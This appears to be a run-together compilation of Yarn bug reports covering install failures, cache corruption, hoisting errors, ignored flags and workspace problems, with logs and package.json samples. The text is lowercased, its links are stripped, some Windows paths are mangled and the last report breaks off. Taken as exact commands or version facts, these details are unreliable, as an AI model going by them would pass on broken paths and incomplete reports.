running `yarn` on root will ignore `test-p2` completely and does not install it's dependencies.
try running `yarn` in `orphan-test-p2` it successfully installs dependencies
fails *sometimes* with errors like the following: ```
yarn install v1.9.4
[1/4] resolving packages...
[2/4] fetching packages...
[1/4] resolving packages...
[2/4] fetching packages...
[1/4] resolving packages...
[2/4] fetching packages...
error extracting tar content of undefined failed, the file appears to be corrupt: "enoent: no such file or directory, chmod \'/usr/local/share/.cache/yarn/v2/npm-lodash-4.17.10-1b7793cf7259ea38fb3661d4d38b3260af8ae4e7/_cachehas.js\'"
info visit for documentation about this command.
yarn install v1.9.4
[1/4] resolving packages...
[2/4] fetching packages...
[1/4] resolving packages...
[2/4] fetching packages...
[1/4] resolving packages...
[2/4] fetching packages...
error extracting tar content of undefined failed, the file appears to be corrupt: "eexist: file already exists, mkdir \'/usr/local/share/.cache/yarn/v2/npm-lodash-4.17.10-1b7793cf7259ea38fb3661d4d38b3260af8ae4e7\'"
info visit for documentation about this command.
yarn install v1.9.4
[1/4] resolving packages...
[2/4] fetching packages...
[1/4] resolving packages...
[2/4] fetching packages...
[1/4] resolving packages...
[2/4] fetching packages...
error extracting tar content of undefined failed, the file appears to be corrupt: "enoent: no such file or directory, chmod \'/usr/local/share/.cache/yarn/v2/npm-fbjs-0.8.17-c4d598ead6949112653d6588b01a5cdcd9f90fdd/lib/resolveimmediate.js\'"
info visit for documentation about this command
``` the occurrence of this error is the challenging part
it does not always fail and does not always fail with the same dependency
the installation is sometimes successful after 3-5 tries
**if the current behavior is a bug, please provide the steps to reproduce.**
i've attempted to install dependencies on bare-metal and in a `node:8-alpine` docker container
both can *sometimes* encounter the error
i've tested this on my personal device in montreal, canada (mac os x10.13), on a aws ec2 instance (ubuntu 18.04), on a gce instance (ubuntu 16.04) and on a production server in france (debian 8)
each of them can sometimes encounter this error
i've also tried installing with and without `yarn.lock` to no avail
find a `package.json` that appears to *sometimes* reproduce the issue [in this gist][0]
the issue does not seem to happen with projects having fewer dependencies.
i'm trying to upgrade to the latest `less` package (3.8.0) released a few hours ago, but yarn ends up not installing the newer version, but still removed the files missing from the newer package which resulted in a corrupted install
i am able to reproduce it consistently on my system:
in a new package folder:
// add previous version of less
ps d:\\develop\ eact-config\\yarnerror> yarn add less@3.7.1
yarn add v1.7.0
info no lockfile found.
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved lockfile.
success saved 55 new dependencies
// check less version
ps d:\\develop\ eact-config\\yarnerror> yarn lessc --version
yarn run v1.7.0
$ d:\\develop\ eact-config\\yarnerror\ ode_modules\\.bin\\lessc --version
lessc 3.7.1 (less compiler) [javascript]
done in 1.26s
// add the newer less
ps d:\\develop\ eact-config\\yarnerror> yarn add less
yarn add v1.7.0
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved lockfile.
success saved 1 new dependency.
info direct dependencies
less@3.8.0
info all dependencies
less@3.8.0
done in 13.65s
// yarn check reports older version still installed
ps d:\\develop\ eact-config\\yarnerror> yarn check
yarn check v1.7.0
error "less" is wrong version: expected "3.8.0", got "3.7.1"
error found 1 errors.
info visit for documentation about this command.
ps d:\\develop\ eact-config\\yarnerror> // again try to get less version results in error
// the file it is referring to 'math-constants' was removed in the latest version
ps d:\\develop\ eact-config\\yarnerror> yarn lessc --version
yarn run v1.7.0
$ d:\\develop\ eact-config\\yarnerror\ ode_modules\\.bin\\lessc --version
module.js:549 throw err; ^ error: cannot find module '../math-constants' at function.module._resolvefilename (module.js:547:15) at function.module._load (module.js:474:25) at module.require (module.js:596:17) at require (internal/module.js:11:18) at object.<anonymous> (d:\\develop\ eact-config\\yarnerror\ ode_modules\\less\\lib\\less\\tree\\declaration.js:5:12) at module._compile (module.js:652:30) at object.module._extensions..js (module.js:663:10) at module.load (module.js:565:32) at trymoduleload (module.js:505:12) at function.module._load (module.js:497:3)
error command failed with exit code 1.
info visit for documentation about this command.
``` i was also able to reproduce this by:
removing all yarn caches
install latest `less` (lessc working at this point)
install older less `less@3.7.1`
yarn check, reports error "less" is wrong version: expected "3.7.1", got "3.8.0"
trying to use `lessc` results in error error: cannot find module '../constants'
this file was added in 3,8,0, and is not available in 3.7.1 i have confirmed that:
the correct version is downloaded by yarn,
it was correctly extracted in the cache folder
yarn 1.7.0 **(installed via scoop)** (path: d:\\installed\\scoop\\apps\\yarn)
{ "dependencies": { "uglifyjs-webpack-plugin": "1.2.7", "terser": "3.7.8" }, "resolutions": { "uglify-es": "npm:terser" }
``` `node_modules/terser` does not exist
`node_modules/uglify-es` does exist
running `yarn upgrade` on packages overtime can result in a dependency tree that hoists an older version of a sub dependency than the one expected to be hoisted to the top level (which is usually used when a main dependency does a `require`)
this is resolved by removing yarn.lock and regenerating
**if the current behavior is a bug, please provide the steps to reproduce.**
that's what i'm not sure
start with some package, let's say `jest` for kicks
start with `v20` and do continuous `yarn upgrade` on that through versions `21`, `22`, etc
till you are on latest
it is a little hard for me to give an exact example because the tools i'm working with are in enterprise
if necessary, i can throw together an example repo where i show what happens
what you should see is that sub dependencies of jest, over time, do not hoist the latest version that jest would rely on due to the `yarn.lock`.
in deploying [a simple change to `package.json`/`yarn.lock`]( which upgrades `plotly.js` from 1.38.3 to 1.39.1, the result is a corrupted `node_modules/plotly.js` please see:
currently, when there are resolutions defined, `--ignore-optional` is ignored and the optional dependencies are installed anyway
you can test it with a simple package.json:
{ "name": "test-optional", "version": "1.0.0", "main": "index.js", "license": "mit", "optionaldependencies": { "fsevents": "^1.0.0" }, "resolutions": { "fsevents": "^1.2.4" }
on `yarn install --ignore-optional` the above will lead to fsevents being installed nonetheless
on linux (ubuntu xenial) for example, this would fail the yarn install due to:
error fsevents@1.2.4: the platform "linux" is incompatible with this module.
error found incompatible module
info visit for documentation about this command.
``` `yarn install --ignore-optional` works as expected with:
{ "name": "test-optional", "version": "1.0.0", "main": "index.js", "license": "mit", "optionaldependencies": { "fsevents": "^1.0.0" }
and does not install `fsevents`.
when using the `--registry` option on `yarn create`, the `create-...` package is being incorrectly loaded from ` ` instead of the registry given in the option
**if the current behavior is a bug, please provide the steps to reproduce.** given that usage info says: ```
$ yarn help create
warning package.json: no license field usage: yarn [command] [flags] creates new projects from any create-* starter kits
options: ..
--registry <url> override configuration registry visit for documentation about this command.
``` i have tried the following without success: ```
$ yarn --registry create @org/app
$ yarn --registry=" " create @org/app
$ yarn create --registry=" " @org/app
$ yarn create @org/app --registry=" "`
``` all produce the same error: ```
error an unexpected error occurred: " not found".
`yarn add /tmp/myproject/a` adds `a` correctly into `node_modules` and updates package.json and yarn.lock as expected
running `yarn --frozen-lockfile`, however, results in the error `error your lockfile needs to be updated, but yarn was run with "--frozen-lockfile".` **if the current behavior is a bug, please provide the steps to reproduce.** - cd some_project
- yarn init -y
- mkdir a && cd a
- yarn init -y && cd ..
- yarn add $pwd/a or yarn add a@$pwd/a or yarn add a@file:$pwd/a
- yarn --frozen-lockfile note: running `yarn` will update the yarn.lock and .yarn-integrity to `"a@file:../../../realtive/path/a"` which will then allow `--frozen-lockfile` installs to succeed.
i'm unable to install the mongoose-post-find package via `yarn add mongoose-post-find`
i see an error stating `an unexpected error occurred: "invalid argument
expected non-empty string."` here\'s example output i\'m seeing with a fresh project/package.json, first thing to install:
$ yarn add mongoose-post-find --verbose
yarn add v1.7.0
info no lockfile found
[2/4] fetching packages...
verbose 1.161 performing "get" request to " ".
verbose 1.212 error: invalid argument
expected non-empty string
at module.exports.module.exports (/home/jamesn/.nvm/versions/node/v8.11.3/lib/node_modules/yarn/lib/cli.js:144857:11) at module.exports.module.exports (/home/jamesn/.nvm/versions/node/v8.11.3/lib/node_modules/yarn/lib/cli.js:147588:23) at isvalidlicense (/home/jamesn/.nvm/versions/node/v8.11.3/lib/node_modules/yarn/lib/cli.js:53259:23) at /home/jamesn/.nvm/versions/node/v8.11.3/lib/node_modules/yarn/lib/cli.js:97239:142 at generator.next (<anonymous>) at step (/home/jamesn/.nvm/versions/node/v8.11.3/lib/node_modules/yarn/lib/cli.js:98:30) at /home/jamesn/.nvm/versions/node/v8.11.3/lib/node_modules/yarn/lib/cli.js:109:13 at <anonymous>
error an unexpected error occurred: "invalid argument
expected non-empty string.".
info if you think this is a bug, please open a bug report with the information provided in "/home/jamesn/clevertech/test/yarn-error.log".
info visit for documentation about this command
a package being installed from the npm registry with bundled dependencies will look for the bundled dependencies on npm registry instead of using the bundled versions
if modules don't exist on the npm registry, the install fails saying
error couldn\'t find package "bundled-package@*" required by "installing-package@x.x.x" on the "npm" registry.
``` **if the current behavior is a bug, please provide the steps to reproduce.** ```
yarn add win-bt
this is my module that i've published to npm, it uses bundled dependencies for some windows specific features, so unfortunately this will only work on windows
there are some other prerequisites that are necessary for a full successful install, but it doesn't get to any of those before this bundled dependencies error so it shouldn't be an issue
alternately, you could potentially use some other module that has bundled dependencies on npm, i just don't know of any specifically that do
regardless, all you have to do is `yarn add` like so and the error shows up.
when `yarn install` or `yarn install <package-name>` is run, "couldn\'t find package "mime-m@~1.30.0" required by "mime-types@~2.1.17" on the "npm" registry." is outputted
when the yarn.lock file is removed, install goes successfully
npm can install successfully as well
the yarn.lock file that has only been touched by yarn
(single-person single-branch git repository) i might've interrupted (^c) yarn in the middle of a command (before the command name or the first progress bar printed) before this occurred, potentially corrupting the yarn.lock file
that's my speculation regarding the cause
**if the current behavior is a bug, please provide the steps to reproduce.**
the repository contains two files: yarn.lock and package.json.
git clone
cd 5973-yarn-bug-repro
``` the package.json in that repo has been stripped to the minimum required to cause the error
the original package.json is [here](
on windows, installing packages with binaries causes yarn to fail during the "linking depenencies..." phase (with an exit code of 0)
**if the current behavior is a bug, please provide the steps to reproduce.**
run `yarn add mkdirp` or `yarn add user-home-cli` or `yarn install` in a directory with a `package.json` including one of those packages as a dependency
i've posted some logs at
in this scenario, i start with an empty project and then add `gulp`, which fails
i then run the same command via [bash on windows]( which succeeds
i then run `yarn add mkdirp` (which was already installed via the previous command) and it both fails and deletes the `node_modules/.bin` folder
when using yarn 1.8 in vsts build after installing packages using yarn install, we then run yarn build and get the following error:
`2018-06-11t18:29:49.2134508z [command]c:\\windows\\system32\\cmd.exe /d /s /c "c:\\hostedtoolcache\\windows\\yarn\\1.8.0\\x64\\yarn-v1.8.0\\bin\\yarn.cmd build"
2018-06-11t18:29:49.7522552z yarn run v1.8.0
2018-06-11t18:29:49.8660587z $ yarn run build-css && yarn run build-js
2018-06-11t18:29:50.7301467z $ node-sass-chokidar src/ -o src/
2018-06-11t18:29:50.7501565z 'node-sass-chokidar' is not recognized as an internal or external command,
2018-06-11t18:29:50.7501882z operable program or batch file.
2018-06-11t18:29:50.7599441z error command failed with exit code 1.`
**if the current behavior is a bug, please provide the steps to reproduce.** try to run another node_module during yarn run script
ex: yarn run build
build: "npm-run-all build-css build-js"
build-css: "node-sass-chokidar src/ -o src/"
build-js: "react-scripts-js build"
when running yarn upgrade-interactive and a dependency does not have a "latest" version then it fails with an error "invalid version: undefined" **if the current behavior is a bug, please provide the steps to reproduce.**
* add a dependency that does not have a "latest" tag (only prerelease versions published with tag "beta")
* run yarn upgrade-interactive
when running `yarn install` when `package.json` contains a dependency which uses a `git+ssh` url and
specifies a branch name with a `#` in the name (common for tracking issues) the installation fails with the following error: ```
error couldn\'t find match for "issue-" in "refs/heads/issue-#1,refs/heads/master" for "git@github.com:cdimitroulas/test-repository.git".
``` example `package.json` dependency:
"dependencies": { "test-module": "git+ssh://git@github.com:cdimitroulas/test-repository.git#issue-#1" }
``` **if the current behavior is a bug, please provide the steps to reproduce.**
create an new repo and initialise with `npm init -y`
create the following `package.json`:
{ "name": "yarn-bug", "version": "1.0.0", "description": "", "main": "index.js", "scripts": { "test": "echo \\"error: no test specified\\" && exit 1" }, "keywords": [], "author": "", "license": "isc", "dependencies": { "test-module": "git+ssh://git@github.com:cdimitroulas/test-repository.git#issue-#1" }
run `yarn install`
after the packages are selected, the installation hangs in place without further output **if the current behavior is a bug, please provide the steps to reproduce.** i updated my version of node.js from v10.0.0 to v10.4.0, this behavior started from v10.2.0
$ yarn upgrade-interactive --latest
i select packages for updating, i press enter and all
when running `yarn publish`, yarn reports `success published.` after having a 400 error code returned on the put request **if the current behavior is a bug, please provide the steps to reproduce.**
the registry is returning 400 on the put request
i'm not sure at this time why our registry is returning a 400.
running `yarn import` fails with the error:
`an unexpected error occurred: "cannot read property \'version\' of undefined".` the full error log:
arguments: /home/cdimitroulas/.nvm/versions/node/v8.11.2/bin/node /usr/share/yarn/bin/yarn.js import path: # omitted yarn version: 1.7.0 node version: 8.11.2 platform: linux x64 trace: typeerror: cannot read property 'version' of undefined at logicaldependencytree.getfixedversionpattern (/usr/share/yarn/lib/cli.js:96794:24) at importpackageresolver.<anonymous> (/usr/share/yarn/lib/cli.js:86608:75) at generator.next (<anonymous>) at step (/usr/share/yarn/lib/cli.js:98:30) at /usr/share/yarn/lib/cli.js:116:14 at new promise (<anonymous>) at new f (/usr/share/yarn/lib/cli.js:23451:28) at importpackageresolver.<anonymous> (/usr/share/yarn/lib/cli.js:95:12) at importpackageresolver.findone (/usr/share/yarn/lib/cli.js:86614:20) at /usr/share/yarn/lib/cli.js:86625:23
$ yarn install --focus
yarn install v1.7.0
[1/4] resolving packages...
[2/4] fetching packages...
info fsevents@1.1.3: the platform "win32" is incompatible with this module.
info "fsevents@1.1.3" is an optional dependency and failed compatibility check
excluding it from installation.
[3/4] linking dependencies...
error an unexpected error occurred: "targethoistmanifest missing".
info if you think this is a bug, please open a bug report with the information provided in "xxx\\yarn-error.log".
info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.** unfortunately, this is in a private monorepo.
i have this in my package.json
"dependencies": { "@babel/core": "^7.0.0-beta.46",
and this in my yarn.lock
"@babel/core@^7.0.0-beta.46": resolved " #b9c164fb9a1e1083f067c236a9da1d7a7d759271" "@babel/core" "^7.0.0-beta.46"
``` i see there is a new babel version with `yarn info @babel/core versions`, the `7.0.0-beta.47`, and i want to update my package.json to reflect it, so i run ```
yarn upgrade-interactive --latest
``` but the newer babel version doesn't show up in the list! it's behaving like the command `yarn upgrade-interactive`, related issue is #4390 maybe it has something to do with the `resolved` url in the yarn.lock?
when the `workspaces` definition contains a trailing slash, running e
`yarn workspaces info` in the root works just as expected
but when you `cd` into the workspace folder and run `yarn workspaces info`, it fails because it cannot detect that that folder is a workspace
**if the current behavior is a bug, please provide the steps to reproduce.** 1
create a new project directory.
create a subdirectory called `package`.
`yarn init` inside `package/`.
`yarn init` in the root.
add `package/` (with trailing slash) as a workspace to the root `package.json`
"workspaces": { "packages": [ "package/" ], }, ..
run `yarn workspaces info` in the root
=> outputs workspace list correctly.
run `yarn workspaces info` in `package/`
=> fails with ``` yarn workspaces v1.6.0 error cannot find the root of your workspace - are you sure you're currently in a workspace? info visit for documentation about this command
if using `yarn create` with a scoped package, it potentially conflicts with a non-scoped (or another scoped) package of the same name
**if the current behavior is a bug, please provide the steps to reproduce.**
if i have a package that installs a global bin script (e.g
`create-react-app`), and i also have a scoped package of the same name (e.g
`@myscope/create-react-app`), the former is used when running `yarn create @myscope/react-app`.
in workspaces, `peerdependencies` that are also present as `devdependencies` are reported as unmet
**if the current behavior is a bug, please provide the steps to reproduce.**
clone run ```
yarn install v1.6.0
info no lockfile found.
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
warning "workspace-aggregator-b6d53714-1712-40de-af51-af5d0487ed3e > a@1.0.0" has unmet peer dependency "react@^16.0.0".
warning "workspace-aggregator-b6d53714-1712-40de-af51-af5d0487ed3e > a@1.0.0" has unmet peer dependency "react-dom@^16.0.0".
[4/4] building fresh packages...
success saved lockfile.
done in 4.49s.
`yarn install --production` does an engine check on devdependencies
using the ```--scripts-prepend-node-path``` switch seems not to do anything
$ /mynodepath/bin/node myyarnpath/bin/yarn.js run --scripts-prepend-node-path env
running this outputs an "env" without ```mynodepath``` in the "path"
{ "node": "/mynodepath/bin/node", ..
"path": "/myproject/node_modules/.bin:/users/jdevine/.config/yarn/link/node_modules/.bin:/myproject/node_modules/.bin:/myproject/node_modules/.bin:/users/jdevine/.config/yarn/link/node_modules/.bin:/myproject/node_modules/.bin:/mynodepath/libexec/lib/node_modules/npm/bin/node-gyp-bin:/mynodepath/lib/node_modules/npm/bin/node-gyp-bin:/mynodepath/bin/node_modules/npm/bin/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/users/jdevine/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin", ...
``` we would expect that the node path (```/mynodepath/bin```) be the first thing in the path in the env
in fact, if i comment out the config check in yarn:
// if (config.scriptsprependnodepath) { pathparts.unshift(path.join(path.dirname(process.execpath)));
``` if i make that change, then see what i expect - the path includes ```/mynodepath/bin```, and my install scripts, and "yarn run" scripts work as expected
{ "node": "/mynodepath/bin/node", ..
"path": "/mynodepath/bin/:/myproject/node_modules/.bin:/users/jdevine/.config/yarn/link/node_modules/.bin:/myproject/node_modules/.bin:/myproject/node_modules/.bin:/users/jdevine/.config/yarn/link/node_modules/.bin:/myproject/node_modules/.bin:/mynodepath/libexec/lib/node_modules/npm/bin/node-gyp-bin:/mynodepath/lib/node_modules/npm/bin/node-gyp-bin:/mynodepath/bin/node_modules/npm/bin/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/users/jdevine/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin", ...
``` **if the current behavior is a bug, please provide the steps to reproduce.**
this reproduces every time.
`yarn install` is not creating symlinks in `node_modules/.bin` for the `bin` entries of dependencies using the `link:` url scheme
**if the current behavior is a bug, please provide the steps to reproduce.**
- unpack [testcase.tar.gz](
- `cd testcase/main-package`
- `yarn install`
- see that `testcase/main-package/node_modules/.bin` is missing.
outputs a lot of text in the terminal **if the current behavior is a bug, please provide the steps to reproduce.** `yarn upgrade --silent`
one `index.js` file for all
**if the current behavior is a bug, please provide the steps to reproduce.**
`yarn upgrade --pattern` seemingly ignores the pattern and upgrades all
**if the current behavior is a bug, please provide the steps to reproduce.**
$ yarn outdated
yarn outdated v1.5.1
info color legend : "<red>" : major update backward-incompatible updates "<yellow>" : minor update backward-compatible features "<green>" : patch update backward-compatible bug fixes
package current wanted latest package type url @fortawesome/fontawesome-free-brands 5.0.9 5.0.10 5.0.10 dependencies @fortawesome/fontawesome-free-regular 5.0.9 5.0.10 5.0.10 dependencies @fortawesome/fontawesome-free-solid 5.0.9 5.0.10 5.0.10 dependencies bootstrap 4.0.0 4.1.0 4.1.0 dependencies $ yarn upgrade --pattern fontawesome
info direct dependencies
@fortawesome/fontawesome-free-brands@5.0.10
@fortawesome/fontawesome-free-regular@5.0.10
@fortawesome/fontawesome-free-solid@5.0.10
bootstrap@4.1.0
$ yarn outdated | grep bootstrap
<no output>
``` @philquinn, am i understanding this feature incorrectly?
`yarn run --non-interactive` gives errors and is interactive **if the current behavior is a bug, please provide the steps to reproduce.** ```
$ yarn run --non-interactive
yarn run v1.6.0
error no command specified.
info commands available from binary scripts: acorn, --snip--
info project commands - dev gulp watch - prod gulp --production
question which command would you like to run?:
if i add a package *dep1* to the nohoist of another package *lib1* and *dep1* also nohoists a third package *dep2* then *dep2* is also installed locally in *lib1* although *lib1* does not directly depend on it
**if the current behavior is a bug, please provide the steps to reproduce.** i created a sample project at which illustrates this
the package *test1* no-hoists package *test2* which no-hoists *request*
after running `yarn` i get the following repo structure:
package.json
test1
index.js
node_modules
request // <- not expected
...
test2 -> ../../test2
package.json
test2
index.js
node_modules
request
...
package.json
yarn.lock
the module "copy" cannot be removed by yarn.
if i run install with production=false and then upgrade, the devdeps installed are being removed
**if the current behavior is a bug, please provide the steps to reproduce.**
using node_env=production
yarn install --production=false
yarn upgrade --scope @something
no more devdeps after this.
**if the current behavior is a bug, please provide the steps to reproduce.** we needed to install a package globally on heroku before running yarn install
we used a preinstall script to install the package
{ "scripts": { "preinstall": "yarn add node-gyp -g", }
``` but yarn install command is going into infinite loop.
bash log looks like this
yarn install v1.5.1
$ yarn add node-gyp -g
yarn add v1.5.1
$ yarn add node-gyp -g
yarn add v1.5.1
$ yarn add node-gyp -g
yarn add v1.5.1
$ yarn add node-gyp -g
yarn add v1.5.1
$ yarn add node-gyp -g
yarn add v1.5.1
$ yarn add node-gyp -g
yarn add v1.5.1
$ yarn add node-gyp -g
yarn add v1.5.1
$ yarn add node-gyp -g
yarn add v1.5.1
$ yarn add node-gyp -g
yarn add v1.5.1
$ yarn add node-gyp -g
yarn add v1.5.1
$ yarn add node-gyp -g
when installing the jquery-ujs package a nested version of jquery is installed which is different to the version specified in package.json **if the current behavior is a bug, please provide the steps to reproduce.** ````
yarn add jquery@3.2.1
yarn add jquery-ujs
```` package.json contents: ````
# this is an autogenerated file
do not edit this file directly.
# yarn lockfile v1 jquery-ujs@^1.2.2: version "1.2.2" resolved " #6a8ef1020e6b6dda385b90a4bddc128c21c56397" dependencies: jquery ">=1.8.0" jquery@3.2.1: version "3.2.1" resolved " #5c4d9de652af6cd0a770154a631bba12b015c787" jquery@>=1.8.0: version "3.3.1" resolved " #958ce29e81c9790f31be7792df5d4d95fc57fbca"
currently yarn outdated prints out the package name, the current version in use, wanted version and the latest version.
yarn install node doesn't provide node_modules/.bin/node, npm install work **if the current behavior is a bug, please provide the steps to reproduce.**
type yarn install node@9.7.0
local /packages are not symlinked whatsoever, with hoisting, and without hoisting.
running a `yarn workspace` command while a flag is in the `.yarnrc` causes an error
**if the current behavior is a bug, please provide the steps to reproduce.**
create a repo with workspaces.
create a `.yarnrc` with a flag included.
run `yarn workspace workspace_name add package_name`
here's a demo repo:
run `yarn workspace package-one add react`.
`yarn install` quits silently if fetching one of the packages times out during fetch phase due to package size and/or network lag.
- yarn does quit before reaching linking phase, therefore no packages are installed
- no error message
- return code 0 (shortened) example output:
$ yarn install --verbose
yarn install v1.5.1
[1/4] resolving packages...
warning: [...]
[2/4] fetching packages...
verbose 1.45 performing "get" request to " ".
verbose 20.696 performing "get" request to " ".
**if the current behavior is a bug, please provide the steps to reproduce.**
`git clone `
`cd theia-apps/theia-java-docker`
`mv next.package.json package.json`
`yarn install` (retry until it fails, maybe use slow internet connection)
the large package here is `@theia/java`, which clocks in at around 33mb.
when you run "yarn webpack" in a directory that contains braces (for example: "c:\\dev\\trunk (build 1)\\webpack") the command gets cut off at the first brace
**if the current behavior is a bug, please provide the steps to reproduce.**
1) create a directory with braces in it
2) try to run a command in this directory (like 'yarn webpack') here is the yarn-error.log:
[yarn-error.log]( this is the output on the console (sorry about the german):
`ps c:\\dev\\syneris_trunk\\web (test 1)> yarn webpack
yarn run v1.5.1
$ "c:\\dev\\syneris_trunk\\web (test 1)\ ode_modules\\.bin\\webpack"
der befehl "c:\\dev\\syneris_trunk\\web" ist entweder falsch geschrieben oder
konnte nicht gefunden werden.
error an unexpected error occurred: "command failed.
exit code: 1
command: c:\\\\windows\\\\system32\\\\cmd.exe
arguments: /d /s /c \\"c:\\\\dev\\\\syneris_trunk\\\\web (test 1)\\
ode_modules\\\\.bin\\\\webpack\\"
directory: c:\\\\dev\\\\syneris_trunk\\\\web (test 1)
info if you think this is a bug, please open a bug report with the information provided in "c:\\\\dev\\\\syneris_trunk\\\\web (test 1)\\\\yarn-error.log".
info visit for documentation about this command.` (you can see it cuts the command off right after "web " where the opening brace starts)
i get this installing our yarn packages., with yarn 1.3.2 it was working fine
this is on a linux box
on my windows box it works fine
2018-03-07 11:43:17 gobuilds.compile : [info] yarn install v1.5.1
2018-03-07 11:43:17 gobuilds.compile : [info] [1/4] resolving packages...
2018-03-07 11:43:18 gobuilds.compile : [info] [2/4] fetching packages...
2018-03-07 11:43:31 gobuilds.compile : [info] info fsevents@1.1.3: the platform "linux" is incompatible with this module.
2018-03-07 11:43:31 gobuilds.compile : [info] info "fsevents@1.1.3" is an optional dependency and failed compatibility check
excluding it from installation.
2018-03-07 11:43:31 gobuilds.compile : [info] [3/4] linking dependencies...
2018-03-07 11:43:37 gobuilds.compile : [info] [4/4] building fresh packages...
2018-03-07 11:43:38 gobuilds.compile : [error] error an unexpected error occurred: "/build/mts/release/sb-14177014/vcac/core/branding/navigation/node_modules/webpack/node_modules/uglifyjs-webpack-plugin: couldn\'t find the binary sh".
2018-03-07 11:43:38 gobuilds.compile : [info] info if you think this is a bug, please open a bug report with the information provided in "/build/mts/release/sb-14177014/vcac/core/branding/navigation/yarn-error.log".
2018-03-07 11:43:38 gobuilds.compile : [info] info visit for documentation about this command.
2018-03-07 11:43:38 gobuilds.compile : [info] info this module is optional, you can safely ignore this error
2018-03-07 11:43:38 gobuilds.compile : [error] warning error running install script for optional dependency: "/build/mts/release/sb-14177014/vcac/core/branding/navigation/node_modules/node-sass: couldn\'t find the binary sh"
2018-03-07 11:43:38 gobuilds.compile : [info] info this module is optional, you can safely ignore this error
2018-03-07 11:43:38 gobuilds.compile : [error] warning error running install script for optional dependency: "/build/mts/release/sb-14177014/vcac/core/branding/navigation/node_modules/uws: couldn\'t find the binary sh"
``` **if the current behavior is a bug, please provide the steps to reproduce.** running 'yarn install'
with yarn 1.3.2 it is working fine
all i did was replace to yarn 1.5.1
`yarn` uses deprecated `new buffer()` constructor and causes deprecation warnings when run with `node_pending_deprecation=1`
$ ag '\\bbuffer\\('
src/registries/npm-registry.js
340: const pw = new buffer(string(password), 'base64').tostring();
341: return 'basic ' + new buffer(string(username) + ':' + pw).tostring('base64'); src/util/fs.js
835:const cr = new buffer('\ ', 'utf8')[0];
836:const lf = new buffer('\ ', 'utf8')[0];
there\'s a package.json, where `"<packagename>": "~4.6.0",` dependency is defined
there's an entry in yarn.lock, which has the following lines:
"<packagename>@~4.6.0": version "4.6.73" resolved " #376e31e5ee9f7c6bb2c89d3921bfe7b24b6a75cf" dependencies: bootstrap-sass "^3.3.7" ember-bootstrap "^1.0.0" ember-bootstrap-datetimepicker "^1.1.0" ember-cli-babel "^5.1.7" ember-cli-htmlbars "^1.3.4" ember-cli-moment-shim "^3.5.0" ember-cli-string-helpers "^1.5.0" ember-component-css "^0.3.7" ember-config-service "^0.1.5" ember-font-awesome "^3.1.0" ember-moment "^7.4.1" ember-power-select "^1.10.4" ember-sticky-element "0.1.3" ember-truth-helpers "^2.0.0" eonasdan-bootstrap-datetimepicker "^4.17.47"
there's a new version of `<packagename>` in repository (4.6.74)
the only thing that is changed in the new version of `<packagename>` is package.json file (with version bumped)
just one number, no other changes at all
**there is no way to update `<packagename>` from `4.6.73` to `4.6.74` without updating all its dependencies**
if `optionaldependencies` contains packages incompatible with current platform, upgrading fails with error "found incompatible module"
**if the current behavior is a bug, please provide the steps to reproduce.** work under `win32` platform:
create package.json:
{ "name": "yarn-example", "version": "1.0.0", "main": "index.js", "license": "mit", "optionaldependencies": { "fsevents": "1.0.0", "chokidar": "2.0.0" }, "private": true
run `yarn install`
run `yarn upgrade --latest`
running scripts from `package.json` that return exit code 1 will output an error message and generate a `yarn-error.log` file, e.g.:
error an unexpected error occurred: "command failed.
exit code: 1
command: sh
arguments: -c eslint --ext js,jsx --max-warnings 0 .
directory: /users/tim/documents/foo
info if you think this is a bug, please open a bug report with the information provided in "/users/tim/documents/foo/yarn-error.log".
info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
run a script that exits with code 1, e.g
{ "scripts": { "lint": "eslint --ext js,jsx --max-warnings 0 ." }
attempting to install a package with an install checkpoint script (accepting terms and conditions) halts `yarn install` execution
package on npm: `@squarespace/server` succeeds with `npm install`: yes
tested: yes, with a single package in package.json this still fails **if the current behavior is a bug, please provide the steps to reproduce.** - create a package.json file with single dependancy: `"@squarespace/server": "^1.1.2"` - run yarn install
when adding packages or just doing `yarn install` in a project, and the project already has some linked projects (via `npm link` command), yarn removes those linked packages and tries to install regular versions of them, and sometimes even fails while removing the linked packages
incidentally same bug is reported in **if the current behavior is a bug, please provide the steps to reproduce.** 1
have a local packaged linked using `npm link`
see 2
link this package in your project, usually by doing `npm link xxx` (where xxx is the local package you linked above) 3
run `yarn install <any new package>` or just `yarn`
using a scoped private repository, in this case bintray.com, yarn will fail to authenticate (http 401)
**if the current behavior is a bug, please provide the steps to reproduce.**
given a `.npmrc` file:
@myprivatescope:registry=
//api.bintray.com/npm/mycompany/npm/:_authtoken="blablaobscurifiedbearertoken"
//api.bintray.com/npm/mycompany/npm/:username=mycompany
//api.bintray.com/npm/mycompany/npm/:email=email@example.com
//api.bintray.com/npm/mycompany/npm/:always-auth=true
``` adding a privately scoped package with yarn:
`yarn add @myprivatescope/cool-internal-module` 1
yarn loads the `.npmrc` file correctly.
yarn successfully makes the initial request:
verbose 1.73 request " "
finished with status code 200.
this request contains the following dist object under `{ "versions" { "1.0.0": { "dist": { ..
} } }`: ```
"dist": { "tarball": " ",
``` notice that the host on the initial request is `api.bintray.com` and the host on the tarball is `dl.bintray.com`
that means, when in [`npm-registry.js:174`]( #l174), this if statement:
`if (requestparts.host === registryparts.host && requestparts.path.startswith(registryparts.path)) {`,
more specifically this conditional: `requestparts.host === registryparts.host`, will be false, because it's comparing `requestparts.host` (api.bintray.com) against `registryparts.host` (dl.bintray.com), which obviously are different.
after upgrading from v1.3.2 to v1.5.1, all `yarn` commands are now failing with the following message: ```
error an unexpected error occurred: "spawn e2big".
info if you think this is a bug, please open a bug report with the information provided in "/users/ev.haus/git/web-platform/yarn-error.log".
info visit for documentation about this command.
``` the `yarn-error.log` shows the following tracestack
